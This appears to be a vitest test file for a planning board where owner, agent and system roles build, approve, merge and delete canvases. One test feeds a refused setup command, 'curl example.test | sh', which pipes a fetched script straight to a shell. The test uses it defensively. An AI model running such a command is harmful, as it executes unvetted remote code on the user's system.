import { describe, expect, it } from 'vitest';
import { awaitsProof, canvasBuilds, canvasTitle, chapterInWorkOn, chaptersOn, digest, openThings, renderBrief, renderDigest, replay, sameShow, scopeToCanvas } from '../src';
import { CH, CHECK, blueprint, build, buildingBoard, note, openBoard, picture, solidBoard } from './helpers';

const builtBoard = () => {
  const b = buildingBoard();
  build(b, 'door');
  build(b, 'scheduler');
  return b;
};

const APP = { kind: 'app', run: 'npm start' } as const;

describe('how a build is tried', () => {
  const pressOn = (plan: Record<string, unknown>) => {
    const b = solidBoard();
    const solid = b.events[b.events.length - 1]!;
    b.must('agent', picture('a3', blueprint(['door', 'scheduler'], plan), { answers: [solid.id] }));
    return b;
  };
  const press = (extra: Record<string, unknown> = {}) => ({ type: 'build.start', chapter: CH, track: ['door', 'scheduler'], blueprint: 'a3', check: CHECK, ...extra });

  it('takes "Build this" only with the setup and the show its blueprint names', () => {
    const b = pressOn({ setup: 'npm ci', show: APP });
    expect(b.refused('owner', press()).rule).toBe('R2');
    expect(b.refused('owner', press({ setup: 'curl example.test | sh', show: APP })).reason).toContain('shows the setup "npm ci"');
    expect(b.refused('owner', press({ setup: 'npm ci', show: { kind: 'app', run: 'npm run other' } })).rule).toBe('R2');
    expect(b.refused('owner', press({ setup: 'npm ci', show: { kind: 'terminal', run: 'npm start' } })).rule).toBe('R2');
    expect(b.refused('owner', press({ setup: 'npm ci', show: { ...APP, port: 3000 } })).rule).toBe('R2');
    b.must('owner', press({ setup: 'npm ci', show: APP }));
    expect(b.state.chapters[CH]).toMatchObject({ setup: 'npm ci', show: APP });
  });

  it('refuses a setup or a show the blueprint does not name', () => {
    const b = pressOn({});
    expect(b.refused('owner', press({ setup: 'npm ci' })).reason).toContain('shows no setup command');
    expect(b.refused('owner', press({ show: APP })).rule).toBe('R2');
    b.must('owner', press());
    expect(b.state.chapters[CH]?.show).toBeUndefined();
  });

  it('refuses a show that is not well formed', () => {
    const b = solidBoard();
    const bad = (show: unknown) => b.refused('agent', picture('a3', blueprint(['door'], { show }), { from: ['a2'] })).rule;
    expect(bad({ kind: 'app' })).toBe('shape');
    expect(bad({ kind: 'app', run: 'npm start', port: 80 })).toBe('shape');
    expect(bad({ kind: 'page', run: 'npm start' })).toBe('shape');
    expect(bad({ kind: 'shell', run: 'sh' })).toBe('shape');
  });

  it('compares two shows word for word', () => {
    expect(sameShow(undefined, undefined)).toBe(true);
    expect(sameShow({ kind: 'page' }, undefined)).toBe(false);
    expect(sameShow({ kind: 'page' }, { kind: 'page' })).toBe(true);
    expect(sameShow(APP, { kind: 'app', run: 'npm start' })).toBe(true);
    expect(sameShow(APP, { kind: 'app', run: 'npm start', port: 3000 })).toBe(false);
    expect(sameShow(APP, { kind: 'terminal', run: 'npm start' })).toBe(false);
  });

  it('writes the setup and the show into the brief', () => {
    const b = pressOn({ setup: 'npm ci', show: { kind: 'terminal', run: 'node calc.js "7 x 8"' } });
    const before = renderBrief(b.state, CH)!;
    expect(before).toContain('## Setup');
    expect(before).toContain('    npm ci');
    expect(before).toContain('## How the owner tries it');
    expect(before).toContain('    node calc.js "7 x 8"');
    b.must('owner', press({ setup: 'npm ci', show: { kind: 'terminal', run: 'node calc.js "7 x 8"' } }));
    expect(renderBrief(b.state, CH)).toContain('    node calc.js "7 x 8"');
  });

  describe('an app is built when it has answered', () => {
    const proved = { type: 'build.proved', chapter: CH };
    const appBoard = () => {
      const b = pressOn({ show: APP });
      b.must('owner', press({ show: APP }));
      return b;
    };

    it('stays building with every part built until the system says the app answered', () => {
      const b = appBoard();
      build(b, 'door');
      expect(awaitsProof(b.state, CH)).toBe(false);
      expect(b.refused('system', proved).rule).toBe('R8');
      build(b, 'scheduler');
      expect(b.state.chapters[CH]?.state).toBe('building');
      expect(awaitsProof(b.state, CH)).toBe(true);
      expect(b.refused('owner', { type: 'canvas.approve', canvas: CH }).reason).toContain('still building on this canvas');
      expect(b.refused('owner', proved).rule).toBe('R6');
      expect(b.refused('agent', proved).rule).toBe('R6');
      b.must('system', proved);
      expect(b.state.chapters[CH]).toMatchObject({ state: 'built', proved: true });
      expect(b.state.feed.at(-1)).toMatchObject({ kind: 'state', by: 'system', text: 'The app started and answered, as you will try it: `npm start`.' });
      expect(awaitsProof(b.state, CH)).toBe(false);
      expect(b.refused('system', proved).rule).toBe('R8');
      b.must('owner', { type: 'canvas.approve', canvas: CH });
    });

    it('needs the app to answer again when a part is built again', () => {
      const b = appBoard();
      build(b, 'door');
      build(b, 'scheduler');
      b.must('system', proved);
      b.must('owner', { type: 'part.state', part: 'door', state: 'idea' });
      expect(b.state.chapters[CH]?.state).toBe('building');
      expect(b.state.chapters[CH]?.proved).toBeUndefined();
      b.must('owner', { type: 'part.state', part: 'door', state: 'solid' });
      build(b, 'door');
      expect(b.state.chapters[CH]?.state).toBe('building');
      expect(awaitsProof(b.state, CH)).toBe(true);
      b.must('system', proved);
      expect(b.state.chapters[CH]?.state).toBe('built');
    });

    it('asks for no proof of a page, a terminal, or a build that names no show', () => {
      for (const show of [undefined, { kind: 'page' }, { kind: 'terminal', run: 'node calc.js' }]) {
        const b = pressOn(show ? { show } : {});
        b.must('owner', press(show ? { show } : {}));
        build(b, 'door');
        build(b, 'scheduler');
        expect(b.state.chapters[CH]?.state).toBe('built');
        expect(b.refused('system', proved).reason).toContain('not tried as an app');
      }
    });

    it('reads a log back to the same board', () => {
      const b = appBoard();
      build(b, 'door');
      build(b, 'scheduler');
      b.must('system', proved);
      expect(replay(b.events)).toEqual(b.state);
    });
  });
});

/** The first idea's canvas is made for it, and takes its id. */
const CV = CH;

describe('canvases', () => {
  it('makes a first canvas for a first idea, and puts later ideas with no canvas named on it', () => {
    const b = openBoard();
    expect(b.state.canvasOrder).toEqual([CV]);
    expect(b.state.chapters[CH]?.canvas).toBe(CV);
    expect(canvasTitle(b.state, CV)).toBe('One engine, many requests');
    b.must('owner', { type: 'chapter.open', chapter: 'next', title: 'The next idea' });
    expect(b.state.canvasOrder).toEqual([CV]);
    expect(chaptersOn(b.state, CV).map((c) => c.id)).toEqual([CH, 'next']);
  });

  it('opens a blank canvas, and an idea on the canvas it names', () => {
    const b = openBoard();
    expect(b.refused('agent', { type: 'canvas.open', canvas: 'c2' }).rule).toBe('R6');
    b.must('owner', { type: 'canvas.open', canvas: 'c2' });
    expect(b.refused('owner', { type: 'canvas.open', canvas: 'c2' }).rule).toBe('R4');
    expect(b.state.canvasOrder).toEqual([CV, 'c2']);
    expect(chaptersOn(b.state, 'c2')).toEqual([]);
    expect(canvasTitle(b.state, 'c2')).toBe('');
    expect(b.refused('owner', { type: 'chapter.open', chapter: 'x', title: 'X', canvas: 'nowhere' }).rule).toBe('R7');
    b.must('owner', { type: 'chapter.open', chapter: 'calc', title: 'A typing calculator', canvas: 'c2' });
    expect(b.state.chapters.calc?.canvas).toBe('c2');
    expect(canvasTitle(b.state, 'c2')).toBe('A typing calculator');
    b.must('owner', { type: 'canvas.open', canvas: 'c3', title: 'Scratch' });
    expect(canvasTitle(b.state, 'c3')).toBe('Scratch');
  });

  it('knows the idea in work on each canvas: none on a blank one, none where all is built', () => {
    const b = buildingBoard();
    b.must('owner', { type: 'canvas.open', canvas: 'c2' });
    expect(chapterInWorkOn(b.state, CV)).toBe(CH);
    expect(chapterInWorkOn(b.state, 'c2')).toBeUndefined();
    build(b, 'door');
    build(b, 'scheduler');
    expect(chapterInWorkOn(b.state, CV)).toBeUndefined();
    b.must('owner', { type: 'chapter.open', chapter: 'more', title: 'One more thing', canvas: CV });
    expect(chapterInWorkOn(b.state, CV)).toBe('more');
  });

  it('shows one canvas as a board of its own', () => {
    const b = buildingBoard();
    b.must('owner', { type: 'canvas.open', canvas: 'c2' });
    b.must('owner', { type: 'chapter.open', chapter: 'calc', title: 'A typing calculator', canvas: 'c2' });
    b.must('owner', { type: 'item.add', chapter: 'calc', item: { id: 'n1', kind: 'note', box: [0, 0, 200, 100], text: 'a calculator' } });
    const two = scopeToCanvas(b.state, 'c2');
    expect(two.chapterOrder).toEqual(['calc']);
    expect(two.itemOrder).toEqual(['n1']);
    expect(Object.keys(two.items)).toEqual(['n1']);
    expect(two.feed).toEqual([]);
    expect(openThings(two).map((o) => o.id)).toEqual(['n1']);
    expect(two.model).toBe(b.state.model);
    const one = scopeToCanvas(b.state, CV);
    expect(one.itemOrder).not.toContain('n1');
    expect(one.feed.length).toBe(b.state.feed.length);
    expect(scopeToCanvas(b.state, 'nowhere').chapterOrder).toEqual([]);
  });

  it('keeps what the owner asked of the whole board in every canvas', () => {
    const b = buildingBoard();
    b.must('owner', { type: 'canvas.open', canvas: 'c2' });
    const ask = b.must('owner', { type: 'ask', what: 'focus', part: 'door' });
    const start = Object.values(b.state.acts).find((a) => a.type === 'build.start')!;
    expect(Object.keys(scopeToCanvas(b.state, 'c2').acts)).toEqual([ask.id]);
    expect(Object.keys(scopeToCanvas(b.state, CV).acts).sort()).toEqual(Object.keys(b.state.acts).sort());
    expect(scopeToCanvas(b.state, 'c2').acts[start.id]).toBeUndefined();
  });
});

describe('approve and merge', () => {
  const approve = { type: 'canvas.approve', canvas: CV };
  const merged = { type: 'canvas.merged', canvas: CV, commit: 'abc1234', into: 'main' };

  it('lets only the owner approve, and only a canvas with something built', () => {
    const b = buildingBoard();
    expect(b.refused('owner', approve).reason).toContain('still building on this canvas');
    build(b, 'door');
    build(b, 'scheduler');
    expect(b.refused('agent', approve).rule).toBe('R6');
    expect(b.refused('system', approve).rule).toBe('R6');
    expect(b.refused('owner', { type: 'canvas.approve', canvas: 'nowhere' }).rule).toBe('R7');
    const open = openThings(b.state).length;
    b.must('owner', approve);
    expect(openThings(b.state)).toHaveLength(open);
    expect(b.state.feed.at(-1)).toMatchObject({ kind: 'state', chapter: CH, text: 'Approved by the owner.' });
    expect(b.state.chapters[CH]?.merged).toBeUndefined();
  });

  it('refuses an approval of a blank canvas, and of one with only an idea', () => {
    const b = solidBoard();
    expect(b.refused('owner', approve).reason).toContain('Nothing on this canvas is built yet');
    b.must('owner', { type: 'canvas.open', canvas: 'c2' });
    expect(b.refused('owner', { type: 'canvas.approve', canvas: 'c2' }).rule).toBe('R8');
  });

  it('lets only the system say that the home branch has it', () => {
    const b = builtBoard();
    expect(b.refused('owner', merged).rule).toBe('R6');
    expect(b.refused('agent', merged).rule).toBe('R6');
    b.must('system', merged);
    expect(b.state.chapters[CH]?.merged).toMatchObject({ commit: 'abc1234', into: 'main' });
    expect(b.state.chapters[CH]?.state).toBe('built');
    expect(b.state.feed.at(-1)).toMatchObject({ kind: 'state', text: 'Merged into main.', commit: 'abc1234' });
    expect(b.refused('system', merged).rule).toBe('R8');
    expect(b.refused('owner', approve).reason).toContain('merged into main already');
    expect(canvasBuilds(b.state, CV)).toMatchObject({ waiting: [], building: [] });
  });

  it('refuses a merge where nothing built waits', () => {
    expect(buildingBoard().refused('system', merged).rule).toBe('R8');
  });

  it('merges every built idea on the canvas, and holds an approval while one of them builds', () => {
    const b = builtBoard();
    b.must('owner', { type: 'chapter.open', chapter: 'more', title: 'One more thing', canvas: CV });
    b.must('agent', { type: 'model.patch', chapter: 'more', ops: [{ op: 'part.set', part: { id: 'cache', name: 'Cache', lane: 'engine' } }] });
    b.must('owner', { type: 'solidify', chapter: 'more', picks: [], parts: ['cache'] });
    // An idea that is decided and not building does not hold the first one's approval.
    expect(canvasBuilds(b.state, CV).waiting.map((c) => c.id)).toEqual([CH]);
    b.must('owner', { type: 'build.start', chapter: 'more', track: ['cache'], check: CHECK });
    expect(b.refused('owner', approve).reason).toContain('"One more thing" is still building');
    build(b, 'cache');
    b.must('owner', approve);
    b.must('system', merged);
    expect(b.state.chapters[CH]?.merged?.commit).toBe('abc1234');
    expect(b.state.chapters.more?.merged?.commit).toBe('abc1234');
  });

  it('forgets the merge when the idea builds again', () => {
    const b = builtBoard();
    b.must('system', merged);
    b.must('owner', { type: 'part.state', part: 'door', state: 'idea' });
    expect(b.state.chapters[CH]?.state).toBe('building');
    expect(b.state.chapters[CH]?.merged).toBeUndefined();
  });

  it('tells the agent which built ideas the home branch has, and which canvas each idea is on', () => {
    const b = builtBoard();
    b.must('owner', { type: 'canvas.open', canvas: 'c2' });
    b.must('owner', { type: 'chapter.open', chapter: 'next', title: 'The next idea', canvas: 'c2' });
    expect(renderDigest(digest(b.state))).toContain(`${CH} on canvas ${CV} [built, not approved yet: not in the home branch]`);
    expect(renderDigest(digest(b.state))).toContain('next on canvas c2 [idea]');
    b.must('system', merged);
    expect(renderDigest(digest(b.state))).toContain(`${CH} on canvas ${CV} [built, merged]`);
  });
});

describe('deleting a canvas', () => {
  const remove = { type: 'canvas.remove', canvas: CV };

  it('is the owner\'s alone', () => {
    const b = buildingBoard();
    expect(b.refused('agent', remove).rule).toBe('R6');
    expect(b.refused('system', remove).rule).toBe('R6');
    expect(b.refused('owner', { type: 'canvas.remove', canvas: 'nowhere' }).rule).toBe('R7');
  });

  it('takes the canvas, its ideas, their items and what waited on them off the board, in any state', () => {
    const b = buildingBoard();
    b.must('agent', { type: 'part.state', part: 'door', state: 'building' });
    b.must('owner', note('m9', 'and what about a queue?'));
    expect(openThings(b.state).length).toBeGreaterThan(0);
    b.must('owner', remove);
    expect(b.state.canvasOrder).toEqual([]);
    expect(b.state.removedCanvases[CV]).toMatchObject({ id: CV });
    expect(b.state.chapters[CH]).toBeUndefined();
    expect(b.state.chapterOrder).toEqual([]);
    expect(b.state.removedChapters[CH]).toMatchObject({ id: CH, state: 'building' });
    expect(Object.values(b.state.items).every((s) => s.removed)).toBe(true);
    expect(openThings(b.state)).toEqual([]);
    expect(b.state.feed).toEqual([]);
    expect(b.state.moments).toEqual([]);
  });

  it('deletes a blank canvas', () => {
    const b = openBoard();
    b.must('owner', { type: 'canvas.open', canvas: 'c2' });
    b.must('owner', { type: 'canvas.remove', canvas: 'c2' });
    expect(b.state.canvasOrder).toEqual([CV]);
    expect(b.refused('owner', { type: 'canvas.open', canvas: 'c2' }).rule).toBe('R4');
    expect(b.refused('owner', { type: 'chapter.open', chapter: 'x', title: 'X', canvas: 'c2' }).reason).toContain('was deleted');
  });

  it('drops the parts its ideas added, and keeps what the repository already had', () => {
    const b = buildingBoard();
    b.must('owner', remove);
    const parts = b.state.model.parts;
    expect(parts.door?.dropped).toBe(true);
    expect(parts.scheduler?.dropped).toBe(true);
    expect(parts.metrics?.dropped).toBe(true);
    expect(parts.handler?.dropped).toBeUndefined();
    expect(b.state.model.edges).toEqual([]);
  });

  it('keeps the parts of an idea the home branch has', () => {
    const b = builtBoard();
    b.must('system', { type: 'canvas.merged', canvas: CV, commit: 'abc1234', into: 'main' });
    b.must('owner', remove);
    expect(b.state.model.parts.door).toMatchObject({ state: 'built' });
    expect(b.state.model.parts.door?.dropped).toBeUndefined();
  });

  it('refuses everything that names what was deleted, and never reuses an id', () => {
    const b = buildingBoard();
    b.must('owner', remove);
    expect(b.refused('owner', remove).reason).toContain('was deleted');
    expect(b.refused('owner', note('m9', 'hello')).rule).toBe('R7');
    expect(b.refused('owner', { type: 'build.pause', chapter: CH }).rule).toBe('R7');
    expect(b.refused('agent', { type: 'part.state', part: 'door', state: 'building' }).rule).toBe('R7');
    expect(b.refused('system', { type: 'part.state', part: 'door', state: 'built', commit: 'c0ffee', check: { cmd: CHECK, passed: true } }).rule).toBe('R7');
    expect(b.refused('owner', { type: 'item.restore', item: 'm1' }).reason).toContain('deleted');
    expect(b.refused('owner', { type: 'chapter.open', chapter: CH, title: 'Again' }).rule).toBe('R4');
    expect(b.refused('owner', { type: 'canvas.open', canvas: CV }).rule).toBe('R4');
    expect(b.refused('system', { type: 'canvas.merged', canvas: CV, commit: 'abc1234', into: 'main' }).rule).toBe('R7');
  });

  it('starts a new first canvas after the only one was deleted', () => {
    const b = buildingBoard();
    b.must('owner', remove);
    b.must('owner', { type: 'chapter.open', chapter: 'fresh', title: 'A fresh start' });
    expect(b.state.canvasOrder).toEqual(['fresh']);
    expect(b.state.chapters.fresh?.canvas).toBe('fresh');
  });

  it('leaves another canvas as it was', () => {
    const b = buildingBoard();
    b.must('owner', { type: 'canvas.open', canvas: 'c2' });
    b.must('owner', { type: 'chapter.open', chapter: 'next', title: 'The next idea', canvas: 'c2' });
    b.must('owner', { type: 'item.add', chapter: 'next', item: { id: 'n1', kind: 'note', box: [0, 0, 200, 100], text: 'a second idea' } });
    b.must('owner', remove);
    expect(b.state.canvasOrder).toEqual(['c2']);
    expect(b.state.chapterOrder).toEqual(['next']);
    expect(b.state.items.n1?.removed).toBe(false);
    expect(openThings(b.state).map((o) => o.id)).toEqual(['n1']);
  });

  it('replays from the log to the same board', () => {
    const b = buildingBoard();
    b.must('owner', { type: 'canvas.open', canvas: 'c2' });
    b.must('owner', remove);
    expect(replay(b.events)).toEqual(b.state);
  });
});
